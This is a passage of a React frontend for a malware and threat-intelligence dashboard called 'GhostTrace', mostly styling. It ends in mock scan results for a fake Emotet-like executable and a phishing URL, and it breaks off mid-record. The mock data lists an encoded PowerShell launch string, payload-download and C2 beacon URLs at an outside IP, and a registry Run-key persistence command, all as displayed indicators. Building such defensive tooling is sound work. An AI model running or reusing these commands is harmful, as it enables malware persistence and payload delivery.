// ═══════════════════════════════════════════════════════════════════════════════
//  GhostTrace v2.0 — AI-Powered Malware, Threat Intelligence & Website Security
//  Complete Frontend  |  React SPA  |  10 Pages  |  All Features Implemented
//  Pages: Dashboard · Scan History · File Scanner · URL Scanner · Log Analyzer
//         IOC Extractor · Attack Timeline · Threat Intel · Reports · Settings
// ═══════════════════════════════════════════════════════════════════════════════
import React, { useState, useEffect, useCallback, useRef, useMemo } from "react";

// ─── GLOBAL CSS ──────────────────────────────────────────────────────────────
const CSS = `
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Syne:wght@400;500;600;700;800;900&display=swap');
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --void:#04060c;--dark:#070a12;--card:#0c1018;--card2:#101520;--hover:#141b28;
  --green:#00ff88;--cyan:#00d4ff;--red:#ff2d55;--amber:#ffaa00;--purple:#8b5cf6;--blue:#3b82f6;--pink:#f472b6;
  --t1:#e8edf5;--t2:#7a8fa8;--t3:#3d5068;--border:rgba(255,255,255,0.055);--border2:rgba(255,255,255,0.09);
  --mono:'JetBrains Mono',monospace;--ui:'Syne',sans-serif;
}
html,body,#root{background:var(--void);color:var(--t1);height:100%;overflow:hidden}
::-webkit-scrollbar{width:4px;height:4px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:#1e2d40;border-radius:2px}
::-webkit-scrollbar-thumb:hover{background:#2a3d54}
@keyframes spin{to{transform:rotate(360deg)}}
@keyframes blink{50%{opacity:0}}
@keyframes fadeUp{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
@keyframes slideIn{from{transform:translateX(-6px);opacity:0}to{transform:none;opacity:1}}
@keyframes countUp{from{opacity:0;transform:scale(.9)}to{opacity:1;transform:none}}

/* ── App Shell ── */
.gt{display:flex;height:100vh;overflow:hidden;font-family:var(--ui)}
.gt-main{flex:1;display:flex;flex-direction:column;overflow:hidden;min-width:0}
.gt-scroll{flex:1;overflow-y:auto;padding:22px 24px}
.view{animation:fadeUp .2s ease}

/* ── Sidebar ── */
.sb{width:232px;min-width:232px;background:var(--dark);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden;position:relative;flex-shrink:0}
.sb-glow{position:absolute;right:0;top:0;width:1px;height:100%;background:linear-gradient(to bottom,transparent,rgba(0,255,136,.3) 50%,transparent);pointer-events:none}
.sb-logo{padding:20px 18px 16px;border-bottom:1px solid var(--border);flex-shrink:0}
.sb-logo-row{display:flex;align-items:center;gap:10px;margin-bottom:3px}
.sb-wordmark{font-weight:900;font-size:19px;letter-spacing:-.5px;background:linear-gradient(130deg,var(--green) 0%,var(--cyan) 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.sb-tagline{font-family:var(--mono);font-size:8px;color:var(--t3);letter-spacing:1.8px;text-transform:uppercase}
.sb-nav{flex:1;padding:12px 10px;overflow-y:auto}
.sb-sec{margin-bottom:18px}
.sb-sec-lbl{font-family:var(--mono);font-size:8px;color:var(--t3);letter-spacing:2.2px;text-transform:uppercase;padding:0 10px 7px;display:block}
.sb-item{display:flex;align-items:center;gap:9px;padding:8px 10px;border-radius:8px;cursor:pointer;font-size:12.5px;font-weight:600;color:var(--t2);border:1px solid transparent;transition:all .12s;margin-bottom:1px;user-select:none;position:relative}
.sb-item:hover{background:var(--hover);color:var(--t1);border-color:rgba(255,255,255,.04)}
.sb-item.active{background:rgba(0,255,136,.07);color:var(--green);border-color:rgba(0,255,136,.15)}
.sb-item.active::before{content:'';position:absolute;left:0;top:18%;height:64%;width:3px;background:var(--green);border-radius:0 2px 2px 0;box-shadow:0 0 10px rgba(0,255,136,.5)}
.sb-ic{font-size:15px;width:18px;text-align:center;flex-shrink:0}
.sb-badge{margin-left:auto;background:rgba(0,255,136,.08);color:var(--green);font-family:var(--mono);font-size:9px;padding:1px 6px;border-radius:9px;border:1px solid rgba(0,255,136,.2);flex-shrink:0}
.sb-badge.red{background:rgba(255,45,85,.1);color:var(--red);border-color:rgba(255,45,85,.2)}
.sb-footer{padding:12px 14px;border-top:1px solid var(--border);flex-shrink:0}
.sb-status-row{display:flex;align-items:center;gap:6px;font-family:var(--mono);font-size:9px;color:var(--t3);margin-bottom:4px}
.sb-dot{width:6px;height:6px;border-radius:50%;background:var(--green);animation:pulse 2.5s ease infinite;box-shadow:0 0 7px var(--green);flex-shrink:0}

/* ── Topbar ── */
.topbar{height:50px;border-bottom:1px solid var(--border);display:flex;align-items:center;padding:0 22px;gap:14px;background:var(--dark);flex-shrink:0}
.topbar-title{font-size:13.5px;font-weight:700;flex:1}
.topbar-chips{display:flex;align-items:center;gap:8px;font-family:var(--mono);font-size:9.5px;color:var(--t3)}
.t-chip{display:flex;align-items:center;gap:5px;padding:3px 8px;background:rgba(255,255,255,.03);border:1px solid var(--border);border-radius:5px}

/* ── Cards ── */
.card{background:var(--card);border:1px solid var(--border);border-radius:10px;position:relative;overflow:hidden}
.card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.05),transparent);pointer-events:none;z-index:1}
.card-hd{padding:13px 18px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;gap:8px;flex-wrap:wrap}
.card-title{font-size:12.5px;font-weight:700;display:flex;align-items:center;gap:7px}
.card-body{padding:18px}

/* ── Stats ── */
.stat-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:13px;margin-bottom:20px}
.stat{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:16px 20px;transition:border-color .18s;cursor:default;position:relative;overflow:hidden}
.stat:hover{border-color:rgba(0,255,136,.2)}
.stat::after{content:'';position:absolute;bottom:0;left:0;right:0;height:2px;border-radius:0 0 10px 10px;opacity:.6}
.stat.c-green::after{background:var(--green)}.stat.c-red::after{background:var(--red)}.stat.c-amber::after{background:var(--amber)}.stat.c-cyan::after{background:var(--cyan)}
.stat-val{font-family:var(--mono);font-size:28px;font-weight:700;line-height:1;margin-bottom:5px;animation:countUp .4s ease}
.stat-lbl{font-size:11.5px;color:var(--t2);font-weight:600}
.stat-sub{font-family:var(--mono);font-size:9px;color:var(--t3);margin-top:7px}

/* ── Badges ── */
.badge{display:inline-flex;align-items:center;gap:4px;padding:2px 8px;border-radius:20px;font-family:var(--mono);font-size:9.5px;font-weight:600;letter-spacing:.4px;text-transform:uppercase;white-space:nowrap;flex-shrink:0}
.b-critical{background:rgba(255,45,85,.1);color:var(--red);border:1px solid rgba(255,45,85,.25)}
.b-high{background:rgba(255,170,0,.1);color:var(--amber);border:1px solid rgba(255,170,0,.25)}
.b-medium{background:rgba(59,130,246,.1);color:var(--blue);border:1px solid rgba(59,130,246,.25)}
.b-low{background:rgba(0,255,136,.08);color:var(--green);border:1px solid rgba(0,255,136,.2)}
.b-clean{background:rgba(0,255,136,.08);color:var(--green);border:1px solid rgba(0,255,136,.2)}
.b-info{background:rgba(0,212,255,.07);color:var(--cyan);border:1px solid rgba(0,212,255,.2)}
.b-purple{background:rgba(139,92,246,.09);color:var(--purple);border:1px solid rgba(139,92,246,.22)}
.b-pink{background:rgba(244,114,182,.09);color:var(--pink);border:1px solid rgba(244,114,182,.22)}
.b-file{background:rgba(59,130,246,.1);color:var(--blue);border:1px solid rgba(59,130,246,.22)}
.b-url{background:rgba(0,212,255,.07);color:var(--cyan);border:1px solid rgba(0,212,255,.2)}
.b-log{background:rgba(139,92,246,.09);color:var(--purple);border:1px solid rgba(139,92,246,.22)}
.b-ioc{background:rgba(244,114,182,.09);color:var(--pink);border:1px solid rgba(244,114,182,.22)}

/* ── Buttons ── */
.btn{display:inline-flex;align-items:center;justify-content:center;gap:6px;padding:8px 16px;border-radius:8px;font-size:12.5px;font-weight:700;cursor:pointer;transition:all .12s;border:none;font-family:var(--ui);white-space:nowrap;flex-shrink:0}
.btn:disabled{opacity:.35;cursor:not-allowed;pointer-events:none}
.btn-primary{background:var(--green);color:#04060c}
.btn-primary:hover:not(:disabled){background:#00e87c;box-shadow:0 0 20px rgba(0,255,136,.3);transform:translateY(-1px)}
.btn-sec{background:rgba(255,255,255,.05);color:var(--t1);border:1px solid var(--border)}
.btn-sec:hover:not(:disabled){background:rgba(255,255,255,.08);border-color:var(--border2)}
.btn-ghost{background:transparent;color:var(--t2);border:1px solid var(--border)}
.btn-ghost:hover:not(:disabled){color:var(--t1);border-color:var(--border2)}
.btn-red{background:rgba(255,45,85,.1);color:var(--red);border:1px solid rgba(255,45,85,.2)}
.btn-red:hover:not(:disabled){background:rgba(255,45,85,.18)}
.btn-sm{padding:5px 11px;font-size:11px;border-radius:6px}
.btn-lg{padding:11px 24px;font-size:14px;border-radius:9px}

/* ── Inputs ── */
.inp{width:100%;background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:8px;padding:10px 14px;font-size:12.5px;color:var(--t1);font-family:var(--mono);outline:none;transition:all .13s}
.inp:focus{border-color:rgba(0,255,136,.4);background:rgba(0,255,136,.025);box-shadow:0 0 0 3px rgba(0,255,136,.07)}
.inp::placeholder{color:var(--t3)}
.inp-label{display:block;font-family:var(--mono);font-size:9.5px;color:var(--t3);letter-spacing:1.5px;text-transform:uppercase;margin-bottom:7px}
.textarea{resize:vertical;min-height:140px;line-height:1.75}
.sel{appearance:none;cursor:pointer}

/* ── Drop Zone ── */
.drop-zone{border:2px dashed rgba(0,255,136,.18);border-radius:12px;padding:44px 28px;text-align:center;cursor:pointer;transition:all .18s;background:rgba(0,255,136,.013)}
.drop-zone:hover,.drop-zone.dragging{border-color:rgba(0,255,136,.5);background:rgba(0,255,136,.04)}
.dz-icon{font-size:40px;margin-bottom:14px;display:block}
.dz-title{font-size:15px;font-weight:700;margin-bottom:7px;color:var(--t1)}
.dz-sub{font-family:var(--mono);font-size:10.5px;color:var(--t3);line-height:1.8}

/* ── Progress / Scan Steps ── */
.scan-steps{display:flex;flex-direction:column;gap:10px}
.s-step{display:flex;align-items:center;gap:12px;animation:slideIn .15s ease}
.s-ic{width:22px;height:22px;display:flex;align-items:center;justify-content:center;font-size:13px;flex-shrink:0}
.s-lbl{flex:1;font-family:var(--mono);font-size:11.5px}
.s-lbl.pending{color:var(--t3)}.s-lbl.running{color:var(--green)}.s-lbl.done{color:var(--t2)}
.s-stat{font-family:var(--mono);font-size:10px}
.s-stat.pending{color:var(--t3)}.s-stat.running{color:var(--cyan);animation:blink 1.1s ease infinite}.s-stat.done{color:var(--green)}
.pbar{height:3px;background:rgba(255,255,255,.05);border-radius:3px;overflow:hidden}
.pbar-fill{height:100%;border-radius:3px;transition:width .45s ease}
.pbar-green{background:linear-gradient(90deg,var(--green),var(--cyan));box-shadow:0 0 8px rgba(0,255,136,.35)}
.pbar-red{background:linear-gradient(90deg,var(--red),#ff6b8a)}
.pbar-amber{background:linear-gradient(90deg,var(--amber),#ffd066)}
.pbar-blue{background:linear-gradient(90deg,var(--blue),var(--cyan))}

/* ── Terminal / AI Output ── */
.terminal{background:#040710;border:1px solid rgba(0,255,136,.14);border-radius:9px;overflow:hidden}
.term-bar{padding:8px 14px;background:rgba(0,255,136,.04);border-bottom:1px solid rgba(0,255,136,.1);display:flex;align-items:center;gap:8px}
.term-dots{display:flex;gap:5px}
.term-dot{width:9px;height:9px;border-radius:50%}
.term-label{font-family:var(--mono);font-size:10px;color:var(--green)}
.term-body{padding:18px 20px;font-family:var(--mono);font-size:11px;line-height:2;color:#8fb08c;white-space:pre-wrap;overflow-x:auto}
.tc-g{color:var(--green)}.tc-r{color:var(--red)}.tc-a{color:var(--amber)}.tc-c{color:var(--cyan)}.tc-p{color:var(--purple)}.tc-b{font-weight:700}.tc-w{color:var(--t1)}

/* ── Risk Ring ── */
.risk-wrap{display:flex;align-items:center;gap:26px;padding:20px 22px;background:var(--card2);border-radius:10px;border:1px solid var(--border);margin-bottom:16px}
.risk-ring{width:92px;height:92px;border-radius:50%;display:flex;flex-direction:column;align-items:center;justify-content:center;flex-shrink:0}
.risk-ring.critical{border:2px solid rgba(255,45,85,.4);background:rgba(255,45,85,.06);box-shadow:0 0 28px rgba(255,45,85,.14)}
.risk-ring.high{border:2px solid rgba(255,170,0,.4);background:rgba(255,170,0,.06);box-shadow:0 0 28px rgba(255,170,0,.1)}
.risk-ring.medium{border:2px solid rgba(59,130,246,.4);background:rgba(59,130,246,.06)}
.risk-ring.low,.risk-ring.clean{border:2px solid rgba(0,255,136,.35);background:rgba(0,255,136,.05);box-shadow:0 0 28px rgba(0,255,136,.08)}
.risk-num{font-family:var(--mono);font-size:30px;font-weight:700;line-height:1}
.risk-num.critical{color:var(--red)}.risk-num.high{color:var(--amber)}.risk-num.medium{color:var(--blue)}.risk-num.low,.risk-num.clean{color:var(--green)}
.risk-denom{font-family:var(--mono);font-size:8px;opacity:.5;margin-top:1px}

/* ── Entropy Bars ── */
.ent-row{margin-bottom:11px}
.ent-hd{display:flex;justify-content:space-between;font-family:var(--mono);font-size:10px;color:var(--t3);margin-bottom:4px}
.ent-bar{height:5px;background:rgba(255,255,255,.05);border-radius:3px;overflow:hidden}
.ent-fill{height:100%;border-radius:3px;transition:width 1.2s ease}

/* ── IOC Tags ── */
.ioc-grid{display:flex;flex-wrap:wrap;gap:6px}
.ioc{display:inline-flex;align-items:center;gap:4px;padding:3px 9px;border-radius:4px;font-family:var(--mono);font-size:10px;word-break:break-all;cursor:default}
.ioc-ip{background:rgba(59,130,246,.1);color:#60a5fa;border:1px solid rgba(59,130,246,.22)}
.ioc-domain{background:rgba(139,92,246,.1);color:#a78bfa;border:1px solid rgba(139,92,246,.22)}
.ioc-hash{background:rgba(255,170,0,.1);color:var(--amber);border:1px solid rgba(255,170,0,.22)}
.ioc-url{background:rgba(255,45,85,.1);color:#ff7f9a;border:1px solid rgba(255,45,85,.22)}
.ioc-email{background:rgba(0,255,136,.07);color:var(--green);border:1px solid rgba(0,255,136,.2)}
.ioc-reg{background:rgba(255,120,0,.1);color:#ffb06a;border:1px solid rgba(255,120,0,.22)}
.ioc-cmd{background:rgba(255,45,85,.07);color:#ff9ab2;border:1px solid rgba(255,45,85,.16)}
.ioc-cve{background:rgba(244,114,182,.1);color:var(--pink);border:1px solid rgba(244,114,182,.22)}

/* ── Tables ── */
.tbl{width:100%;border-collapse:collapse;font-size:11.5px}
.tbl th{font-family:var(--mono);font-size:9px;text-transform:uppercase;letter-spacing:1.3px;color:var(--t3);font-weight:600;text-align:left;padding:8px 12px;border-bottom:1px solid var(--border)}
.tbl td{padding:9px 12px;border-bottom:1px solid rgba(255,255,255,.024);color:var(--t2);vertical-align:middle}
.tbl tr:last-child td{border-bottom:none}
.tbl tbody tr:hover td{background:rgba(255,255,255,.012)}
.tbl-nowrap{white-space:nowrap}

/* ── Check Rows ── */
.ck-row{display:flex;align-items:center;gap:11px;padding:8px 0;border-bottom:1px solid rgba(255,255,255,.028)}
.ck-row:last-child{border-bottom:none}
.ck-ic{width:17px;text-align:center;font-size:12px;flex-shrink:0}
.ck-lbl{flex:1;font-size:12px;color:var(--t2)}
.ck-val{font-family:var(--mono);font-size:10.5px;text-align:right;max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}

/* ── Info Boxes ── */
.info-box{background:rgba(0,212,255,.04);border:1px solid rgba(0,212,255,.15);border-radius:8px;padding:11px 14px;font-family:var(--mono);font-size:10.5px;color:var(--cyan);line-height:1.75}
.warn-box{background:rgba(255,170,0,.04);border:1px solid rgba(255,170,0,.15);border-radius:8px;padding:11px 14px;font-family:var(--mono);font-size:10.5px;color:var(--amber);line-height:1.75}
.err-box{background:rgba(255,45,85,.04);border:1px solid rgba(255,45,85,.15);border-radius:8px;padding:11px 14px;font-family:var(--mono);font-size:10.5px;color:var(--red);line-height:1.75}
.ok-box{background:rgba(0,255,136,.04);border:1px solid rgba(0,255,136,.15);border-radius:8px;padding:11px 14px;font-family:var(--mono);font-size:10.5px;color:var(--green);line-height:1.75}

/* ── YARA hits ── */
.yara-hit{display:flex;align-items:center;gap:10px;padding:9px 13px;background:rgba(255,45,85,.05);border:1px solid rgba(255,45,85,.15);border-radius:7px;margin-bottom:7px}
.yara-name{flex:1;color:var(--red);font-family:var(--mono);font-size:11px;font-weight:600}

/* ── Timeline ── */
.tl-wrap{position:relative;padding-left:28px}
.tl-wrap::before{content:'';position:absolute;left:8px;top:6px;bottom:6px;width:1px;background:linear-gradient(to bottom,var(--green),rgba(0,255,136,.1))}
.tl-event{position:relative;margin-bottom:22px;animation:fadeUp .18s ease}
.tl-event::before{content:'';position:absolute;left:-24px;top:6px;width:10px;height:10px;border-radius:50%;border:2px solid var(--green);background:var(--dark);z-index:1}
.tl-event.critical::before{border-color:var(--red);background:rgba(255,45,85,.2);box-shadow:0 0 10px rgba(255,45,85,.4)}
.tl-event.high::before{border-color:var(--amber);background:rgba(255,170,0,.15)}
.tl-event.medium::before{border-color:var(--blue)}
.tl-time{font-family:var(--mono);font-size:9.5px;color:var(--t3);margin-bottom:5px;display:flex;align-items:center;gap:8px}
.tl-card{background:var(--card2);border:1px solid var(--border);border-radius:8px;padding:12px 15px}
.tl-title{font-size:12.5px;font-weight:700;color:var(--t1);margin-bottom:4px}
.tl-body{font-family:var(--mono);font-size:10.5px;color:var(--t2);line-height:1.75}

/* ── Health Score ── */
.hs-wrap{display:grid;grid-template-columns:130px 1fr;gap:28px;align-items:start;padding:22px;background:var(--card2);border-radius:10px;border:1px solid var(--border);margin-bottom:16px}
.hs-circle{width:110px;height:110px;border-radius:50%;display:flex;flex-direction:column;align-items:center;justify-content:center;margin:0 auto 10px}
.hs-score-val{font-family:var(--mono);font-size:36px;font-weight:700;line-height:1}
.hs-score-max{font-family:var(--mono);font-size:11px;opacity:.5}
.hs-bars{display:flex;flex-direction:column;gap:13px}
.hs-bar-row{display:flex;align-items:center;gap:10px}
.hs-bar-lbl{font-size:11.5px;font-weight:600;width:160px;flex-shrink:0;color:var(--t1)}
.hs-bar-track{flex:1;height:7px;background:rgba(255,255,255,.05);border-radius:4px;overflow:hidden}
.hs-bar-fill{height:100%;border-radius:4px;transition:width 1.3s ease}
.hs-bar-val{font-family:var(--mono);font-size:10px;width:36px;text-align:right;flex-shrink:0}

/* ── Injection Findings ── */
.inj-finding{display:flex;gap:12px;padding:13px 15px;background:rgba(255,45,85,.04);border:1px solid rgba(255,45,85,.14);border-radius:8px;margin-bottom:9px;animation:fadeUp .15s ease}
.inj-icon{font-size:18px;flex-shrink:0;margin-top:1px}
.inj-body{flex:1}
.inj-title{font-size:12.5px;font-weight:700;color:var(--red);margin-bottom:3px}
.inj-detail{font-family:var(--mono);font-size:10.5px;color:var(--t2);line-height:1.7}
.inj-finding.warn{background:rgba(255,170,0,.04);border-color:rgba(255,170,0,.14)}
.inj-finding.warn .inj-title{color:var(--amber)}
.inj-finding.info{background:rgba(0,212,255,.04);border-color:rgba(0,212,255,.14)}
.inj-finding.info .inj-title{color:var(--cyan)}

/* ── Vulnerability rows ── */
.vuln-row{padding:13px 15px;border:1px solid var(--border);border-radius:8px;margin-bottom:8px;background:var(--card2);transition:border-color .12s}
.vuln-row:hover{border-color:var(--border2)}
.vuln-hd{display:flex;align-items:center;gap:10px;margin-bottom:6px;flex-wrap:wrap}
.vuln-name{flex:1;font-size:12.5px;font-weight:700;color:var(--t1)}
.vuln-evidence{font-family:var(--mono);font-size:10px;color:var(--t3);line-height:1.7;padding:7px 10px;background:rgba(255,255,255,.025);border-radius:5px;margin-top:7px;word-break:break-all;white-space:pre-wrap}
.vuln-fix{font-size:11px;color:var(--t2);margin-top:6px}

/* ── Activity / History ── */
.act-item{display:flex;align-items:center;gap:12px;padding:10px 0;border-bottom:1px solid rgba(255,255,255,.03)}
.act-item:last-child{border-bottom:none}
.act-icon-box{width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0}
.act-name{font-size:12.5px;font-weight:600;color:var(--t1);margin-bottom:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:220px}
.act-meta{font-family:var(--mono);font-size:9.5px;color:var(--t3)}

/* ── Report Cards ── */
.rep-card{display:flex;align-items:center;gap:13px;padding:13px;border:1px solid var(--border);border-radius:9px;margin-bottom:8px;cursor:pointer;transition:all .12s;background:var(--card)}
.rep-card:hover{border-color:rgba(0,255,136,.2);background:var(--hover)}
.rep-icon{width:40px;height:40px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}
.rep-name{font-size:12.5px;font-weight:700;color:var(--t1);margin-bottom:3px}
.rep-meta{font-family:var(--mono);font-size:9.5px;color:var(--t3)}

/* ── Tabs ── */
.tabs{display:flex;gap:2px;background:rgba(255,255,255,.03);border-radius:9px;padding:3px;margin-bottom:18px;flex-wrap:wrap}
.tab{flex:1;min-width:0;padding:7px 8px;border-radius:7px;font-size:11px;font-weight:700;cursor:pointer;text-align:center;color:var(--t2);border:none;background:none;font-family:var(--ui);transition:all .12s;white-space:nowrap}
.tab.on{background:var(--card2);color:var(--t1);box-shadow:0 1px 5px rgba(0,0,0,.3)}

/* ── Feature Grid ── */
.feat-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:11px;margin-bottom:18px}
.feat-card{background:var(--card);border:1px solid var(--border);border-radius:9px;padding:14px 16px}
.feat-icon{font-size:20px;margin-bottom:9px}
.feat-name{font-size:12.5px;font-weight:700;color:var(--t1);margin-bottom:3px}
.feat-desc{font-family:var(--mono);font-size:10px;color:var(--t3);line-height:1.65}

/* ── Search Bar ── */
.search-bar{display:flex;align-items:center;gap:10px;background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:8px;padding:0 12px;height:38px;transition:border-color .13s}
.search-bar:focus-within{border-color:rgba(0,255,136,.35);background:rgba(0,255,136,.02)}
.search-bar input{background:none;border:none;outline:none;color:var(--t1);font-family:var(--mono);font-size:12px;flex:1;min-width:0}
.search-bar input::placeholder{color:var(--t3)}

/* ── Toggle Switch ── */
.toggle-wrap{width:36px;height:20px;border-radius:10px;background:rgba(255,255,255,.08);border:1px solid var(--border);position:relative;cursor:pointer;transition:all .15s;flex-shrink:0}
.toggle-wrap.on{background:rgba(0,255,136,.2);border-color:rgba(0,255,136,.35)}
.toggle-knob{position:absolute;top:2px;left:2px;width:16px;height:16px;border-radius:50%;background:var(--t3);transition:all .15s;pointer-events:none}
.toggle-wrap.on .toggle-knob{left:18px;background:var(--green)}

/* ── MITRE Badge ── */
.mitre{display:inline-flex;align-items:center;gap:4px;padding:2px 7px;background:rgba(139,92,246,.1);border:1px solid rgba(139,92,246,.22);border-radius:4px;font-family:var(--mono);font-size:9px;color:var(--purple);white-space:nowrap}

/* ── Code Block ── */
.code-block{background:#040710;border:1px solid rgba(255,255,255,.07);border-radius:7px;padding:12px 15px;font-family:var(--mono);font-size:10.5px;color:#8fb08c;line-height:1.75;overflow-x:auto;white-space:pre}
.hash-pill{font-family:var(--mono);font-size:10px;color:var(--t2);background:rgba(255,255,255,.04);padding:2px 7px;border-radius:4px;border:1px solid var(--border);word-break:break-all;display:inline-block}

/* ── Misc ── */
.spinner{width:17px;height:17px;border:2px solid rgba(0,255,136,.15);border-top-color:var(--green);border-radius:50%;animation:spin .7s linear infinite;flex-shrink:0}
.sec-hd{font-family:var(--mono);font-size:9.5px;font-weight:600;color:var(--t3);text-transform:uppercase;letter-spacing:1.8px;display:flex;align-items:center;gap:8px;margin-bottom:12px}
.sec-hd::before{content:'';width:12px;height:1px;background:var(--green);opacity:.5;flex-shrink:0}
.empty-state{text-align:center;padding:52px 20px}
.empty-icon{font-size:38px;margin-bottom:14px;opacity:.5}
.empty-title{font-size:14px;font-weight:700;color:var(--t2);margin-bottom:6px}
.empty-sub{font-family:var(--mono);font-size:10.5px;color:var(--t3);line-height:1.7}
.live-dot{width:6px;height:6px;border-radius:50%;background:var(--green);display:inline-block;animation:pulse 2s ease infinite;box-shadow:0 0 6px var(--green)}
.g2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
.g3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px}
.fac{display:flex;align-items:center}
.fjsb{display:flex;align-items:center;justify-content:space-between}
.gap6{gap:6px}.gap8{gap:8px}.gap10{gap:10px}.gap12{gap:12px}.gap16{gap:16px}
.f1{flex:1}.f0{flex-shrink:0}
.mb6{margin-bottom:6px}.mb8{margin-bottom:8px}.mb12{margin-bottom:12px}.mb16{margin-bottom:16px}.mb18{margin-bottom:18px}.mb20{margin-bottom:20px}.mb24{margin-bottom:24px}
.mt8{margin-top:8px}.mt12{margin-top:12px}.mt16{margin-top:16px}.mt20{margin-top:20px}
.w100{width:100%}.mono{font-family:var(--mono)}.bold{font-weight:700}
.txt-sm{font-size:12px}.txt-xs{font-size:10.5px;font-family:var(--mono)}
.txt-muted{color:var(--t3)}.txt-sec{color:var(--t2)}
.txt-red{color:var(--red)}.txt-green{color:var(--green)}.txt-amber{color:var(--amber)}.txt-cyan{color:var(--cyan)}
@media(max-width:920px){
  .stat-grid{grid-template-columns:1fr 1fr}
  .g2,.g3,.feat-grid,.hs-wrap{grid-template-columns:1fr}
  .sb{width:52px;min-width:52px}
  .sb-wordmark,.sb-tagline,.sb-sec-lbl,.sb-item>span:last-of-type,.sb-badge,.sb-footer span{display:none}
  .sb-item{justify-content:center;padding:10px}
}
`;

// ═══════════════════════════════════════════════════════════════════════════════
// DATA LAYER — Mock scan results & threat intelligence data
// ═══════════════════════════════════════════════════════════════════════════════

const D_FILE = {
  filename:"invoice_update_Q4.exe", size:"2.4 MB", type:"PE32 Executable (Windows x86, GUI)",
  md5:"a1b2c3d4e5f678901234567890abcdef",
  sha1:"abc123def456789012345678901234567890abcd12",
  sha256:"0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
  entropy:7.82, packed:true, signed:false, vt_ratio:"61/72",
  sections:[{n:".text",e:7.91,s:true},{n:".data",e:6.23,s:false},{n:".rsrc",e:7.88,s:true},{n:".pdata",e:5.44,s:false},{n:".reloc",e:4.12,s:false}],
  imports:["CreateRemoteThread","VirtualAllocEx","WriteProcessMemory","LoadLibraryA","GetProcAddress","WinExec","URLDownloadToFile"],
  strings:[
    {v:"cmd.exe /c powershell -encodedCommand JABzAG...",sus:true},
    {v:"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",sus:true},
    {v:"http://185.220.101.47/payload.bin",sus:true},
    {v:"CreateRemoteThread",sus:true},
    {v:"VirtualAllocEx",sus:true},
    {v:"svchost32.exe",sus:true},
    {v:"kernel32.dll",sus:false},
    {v:"ntdll.dll",sus:false},
    {v:"VERSION.dll",sus:false},
  ],
  yara:["Trojan.Win32.Emotet.ABCD","Suspicious.PE.ProcessInjection","Malware.Packer.UPX.Modified","HEUR.Trojan.Win32.Generic"],
  risk:87, level:"CRITICAL",
  iocs:{
    ips:["185.220.101.47"],
    hashes:["a1b2c3d4e5f678901234567890abcdef","0123456789abcdef0123456789abcdef01234567"],
    reg_keys:["HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost32"],
    commands:["cmd.exe /c powershell -encodedCommand JABzAGUAcgB2AGUA","reg add HKLM\\Software\\CurrentVersion\\Run /v svchost32"],
    urls:["http://185.220.101.47/payload.bin","http://185.220.101.47/c2/beacon"],
    domains:[],emails:[],cves:[],
  },
  ai:`<span class="tc-b tc-r">⚑ THREAT CLASSIFICATION: Trojan Dropper / Credential Harvester (Emotet Family)</span>

This executable carries <span class="tc-b tc-r">multiple high-confidence malware indicators</span> consistent with the <span class="tc-c">Emotet</span> banking trojan — one of the most prolific malware families, historically used to deliver TrickBot, Ryuk ransomware, and mass credential theft campaigns.

<span class="tc-b tc-a">PROCESS INJECTION (T1055.001):</span>
The classic injection triad — <span class="tc-c">CreateRemoteThread</span> + <span class="tc-c">VirtualAllocEx</span> + <span class="tc-c">WriteProcessMemory</span> — allocates memory inside a legitimate process (likely svchost.exe), writes shellcode, then executes it remotely. Malicious activity originates from a trusted system process, bypassing behavioral detection.

<span class="tc-b tc-a">REGISTRY PERSISTENCE (T1547.001):</span>
Hardcoded path to <span class="tc-c">HKLM\\CurrentVersion\\Run</span> confirms AutoRun persistence. Registers as <span class="tc-c">svchost32.exe</span> under ProgramData — impersonates a legitimate system binary name. Survives reboots without user interaction.

<span class="tc-b tc-a">PACKED / ENCRYPTED PAYLOAD (T1027):</span>
Section entropy of <span class="tc-c">7.91</span> (.text) and <span class="tc-c">7.88</span> (.rsrc) approach the theoretical maximum of 8.0, confirming UPX-modified packing with a custom XOR decryption stub. Payload is only decrypted at runtime in memory — defeats all static AV signatures.

<span class="tc-b tc-a">C2 COMMUNICATION (T1071.001):</span>
Embedded IP <span class="tc-r">185.220.101.47</span> is a confirmed Emotet C2 server with 94 AbuseIPDB reports. Beacon pattern <span class="tc-c">/c2/beacon</span> is consistent with Emotet's HTTP polling for task retrieval and secondary payload download.

<span class="tc-b tc-r">⚠ IMMEDIATE: Quarantine host. Block 185.220.101.47 at firewall. DO NOT execute. Forensic image before remediation. Audit all lateral hosts for beaconing.</span>`
};

const D_URL = {
  url:"https://secure-paypa1.com/login/verify?session=a9f3b",
  ip:"185.220.101.47", country:"RU 🇷🇺", isp:"Frantech Solutions (Bulletproof Hosting)",
  domain_age:"3 days", registrar:"NameCheap (Privacy Protected)",
  ssl:{valid:false, issuer:"Self-signed", expiry:"2022-01-01"},
  redirects:["http://secure-paypa1.com → https://secure-paypa1.com/login/verify"],
  tech:["PHP 5.6 (EOL)","Apache 2.2 (EOL)","No WAF","No CSP","No HSTS"],
  rep:{vt:23,urlscan:"Phishing",abuseipdb:94,phishtank:true},
  content:{
    login_form:true, pass_field:true,
